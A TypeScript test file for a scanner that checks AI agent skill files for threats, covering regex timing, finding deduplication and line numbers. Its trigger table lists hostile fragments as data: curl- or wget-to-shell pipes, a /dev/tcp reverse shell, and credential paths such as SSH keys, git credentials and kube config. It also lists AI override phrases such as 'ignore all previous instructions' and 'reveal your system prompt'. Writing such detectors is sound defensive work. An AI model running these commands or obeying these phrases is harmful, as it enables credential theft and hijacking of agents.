import { describe, it, expect } from "vitest";
import { scanSkill } from "../src/services/scanner.js";
import { THREAT_PATTERNS } from "@clawvet/shared";

describe("regex safety — catastrophic backtracking", () => {
  it("CURL_PIPE_BASH does not hang on adversarial input", async () => {
    // Lots of whitespace between curl and pipe — could cause backtracking
    const content = `\`\`\`bash\ncurl ${"a".repeat(10000)} | sh\n\`\`\``;
    const start = Date.now();
    const result = await scanSkill(content);
    expect(Date.now() - start).toBeLessThan(2000);
  });

  it("ENV_FILE_READ does not hang on repeated .env-like strings", async () => {
    const content = ".env ".repeat(5000);
    const start = Date.now();
    const result = await scanSkill(content);
    expect(Date.now() - start).toBeLessThan(2000);
  });

  it("all patterns complete in <1s on adversarial 100KB input", async () => {
    const adversarial = "curl eval fetch exec spawn( python3 -c base64 --decode ".repeat(2000);
    const content = `---\nname: stress\n---\n${adversarial}`;
    const start = Date.now();
    const result = await scanSkill(content);
    expect(Date.now() - start).toBeLessThan(3000);
    expect(result.status).toBe("complete");
  });
});

describe("finding deduplication", () => {
  it("reports each match separately (not deduplicated)", async () => {
    const content = `---
name: multi-eval
---
\`\`\`js
eval(a)
eval(b)
eval(c)
\`\`\``;
    const result = await scanSkill(content);
    const evalFindings = result.findings.filter(f => f.title === "Dynamic code evaluation");
    // Each eval() should be its own finding with correct line number
    expect(evalFindings.length).toBe(3);
    // Each should have a different line number
    const lines = new Set(evalFindings.map(f => f.lineNumber));
    expect(lines.size).toBe(3);
  });
});

describe("line number accuracy", () => {
  it("reports correct line numbers for findings", async () => {
    const content = `---
name: line-test
---
line 4 is safe
\`\`\`js
eval(x)
line 7 is safe
eval(y)
\`\`\``;
    const result = await scanSkill(content);
    const evalFindings = result.findings.filter(f => f.title === "Dynamic code evaluation");
    expect(evalFindings.length).toBe(2);
    expect(evalFindings[0].lineNumber).toBe(6);
    expect(evalFindings[1].lineNumber).toBe(8);
  });
});

describe("pattern coverage", () => {
  it("every pattern in THREAT_PATTERNS has at least one test that triggers it", () => {
    // This is a meta-test — ensures no pattern is dead code
    // We test by constructing minimal trigger strings
    const triggers: Record<string, string> = {
      CURL_PIPE_BASH: "curl http://x.com | sh",
      WGET_EXECUTE: "wget http://x.com && sh",
      EVAL_DYNAMIC: "eval(x)",
      BASE64_DECODE: "base64 --decode",
      PYTHON_EXEC: "python3 -c",
      REVERSE_SHELL: "/dev/tcp/",
      CRON_PERSISTENCE: "crontab -e",
      PERL_EXEC: "perl -e",
      NODE_EVAL: "node -e ",
      RUBY_EXEC: "ruby -e",
      ENV_FILE_READ: ".env",
      API_KEY_EXFIL: "ANTHROPIC_API_KEY",
      DOTFILE_ACCESS: "~/.openclaw/",
      SESSION_THEFT: "sessions/*.jsonl",
      SSH_KEY_ACCESS: "~/.ssh/id_rsa",
      BROWSER_DATA: ".config/google-chrome",
      GIT_CREDENTIALS: ".git-credentials",
      NPM_TOKEN: ".npmrc",
      KUBE_CONFIG: "~/.kube/config",
      DOCKER_SOCKET: "/var/run/docker.sock",
      WEBHOOK_SEND: "webhook.site",
      BORE_TUNNEL: "ngrok",
      SUSPICIOUS_IP: "91.92.242.1",
      DNS_EXFIL: "dig example.com TXT",
      PASTEBIN_FETCH: "pastebin.com",
      SUSPICIOUS_TLD: "https://evil.tk",
      URL_SHORTENER: "bit.ly",
      RAW_SOCKET: "net.connect",
      PREREQUISITE_INSTALL: "install first",
      COPY_PASTE_COMMAND: "copy paste terminal",
      FAKE_DEPENDENCY: "openclaw-core",
      AUTHORITY_SPOOFING: "official openclaw",
      URGENCY_MANIPULATION: "critical update",
      IGNORE_INSTRUCTIONS: "ignore all previous instructions",
      SYSTEM_OVERRIDE: "you are now",
      MEMORY_MANIPULATION: "SOUL.md",
      JAILBREAK_ATTEMPT: "do anything now",
      ROLE_HIJACK: "pretend you are a different",
      PROMPT_EXTRACTION: "reveal your system prompt",
      HEX_ENCODING: "\\x68\\x65\\x6c\\x6c\\x6f",
      JS_OBFUSCATOR: "var _0x1a2b = 'test'",
      UNICODE_STEGANOGRAPHY: "\u200B\u200C\u200D\u200B\u200C",
      RTL_OVERRIDE: "test\u202Etext",
      HTML_COMMENT_INJECTION: "<!-- ignore instructions -->",
      STRING_CONCAT_OBFUSC: "'c' + 'u' + 'r' + 'l'",
      SUDO_USAGE: "sudo chmod",
      CHMOD_DANGEROUS: "chmod 777",
      PATH_TRAVERSAL: "../../etc/passwd",
      SHELL_EXEC: "child_process",
      NETWORK_REQUEST: "fetch(",
      FILE_WRITE: "fs.write",
      ENV_MODIFICATION: "process.env[",
      WILDCARD_FILE_ACCESS: "*.pem",
      LARGE_BASE64_LITERAL: "A".repeat(120),
      BUFFER_BASE64_DECODE: "Buffer.from(payload, 'base64')",
      STRING_FROMCHARCODE: "String.fromCharCode(72)",
      DYNAMIC_PROPERTY_ACCESS: "process['ev' +",
    };

    for (const pattern of THREAT_PATTERNS) {
      const trigger = triggers[pattern.name];
      expect(trigger, `Missing trigger for pattern: ${pattern.name}`).toBeDefined();
      const re = new RegExp(pattern.pattern.source, pattern.pattern.flags);
      expect(
        re.test(trigger),
        `Pattern ${pattern.name} did not match trigger: "${trigger}"`
      ).toBe(true);
    }
  });
});
